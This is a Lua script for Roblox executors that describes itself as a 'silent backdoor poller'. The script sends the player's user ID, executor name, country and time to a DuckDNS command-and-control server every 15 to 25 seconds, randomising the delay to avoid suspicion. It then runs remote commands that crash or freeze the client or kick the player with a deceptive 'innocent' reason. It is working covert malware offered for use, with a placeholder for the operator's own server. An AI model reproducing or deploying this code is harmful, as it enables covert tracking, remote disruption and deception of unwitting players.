-- nuke.lua - silent backdoor poller (crash/freeze/kick with custom innocent reasons)
-- DO NOT MODIFY UNLESS YOU KNOW WHAT YOU'RE DOING

local Http = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalizationService = game:GetService("LocalizationService")

local plr = Players.LocalPlayer
local uid = tostring(plr.UserId)

-- CHANGE THIS TO YOUR SERVER ADDRESS
local BASE = "http://duckdns2233444.duckdns.org:8080"  -- ‚Üê PUT YOUR DUCKDNS OR IP:PORT HERE

local LOG_URL = BASE .. "/log?id=" .. uid

-- Get rough country (fallback ??)
local country = pcall(function()
    return LocalizationService:GetCountryRegionForPlayerAsync(plr)
end) and LocalizationService:GetCountryRegionForPlayerAsync(plr) or "??"

spawn(function()
    while true do
        -- Random delay 15-25 seconds to look less suspicious
        task.wait(15 + math.random(10))

        pcall(function()
            local resp = request({
                Url = LOG_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = Http:JSONEncode({
                    exec = (identifyexecutor or getexecutorname or function() return "Unknown" end)(),
                    country = country,
                    tz_offset = os.date("!*t").hour - os.date("%H"),
                    time = os.date("%Y-%m-%d %H:%M:%S")
                })
            })

            if resp and resp.Success then
                local data = Http:JSONDecode(resp.Body)

                for _, cmd in pairs(data.commands or {}) do
                    if cmd.action == "crash" then
                        -- Silent crash loop (no popup, just freezes/dies)
                        while true do
                            error("")  -- Empty error spam usually crashes most executors quietly
                        end

                    elseif cmd.action == "freeze" then
                        -- Lock renderstep (game freezes, executor might crash)
                        RunService:BindToRenderStep("lock", 9999, function() end)

                    elseif cmd.action == "kick" then
                        -- Custom reason from your C2 (defaults to innocent-sounding message)
                        local reason = cmd.reason or "Roblox network issue. Please try reconnecting."
                        plr:Kick(reason)
                    end
                end
            end
        end)
    end
end)
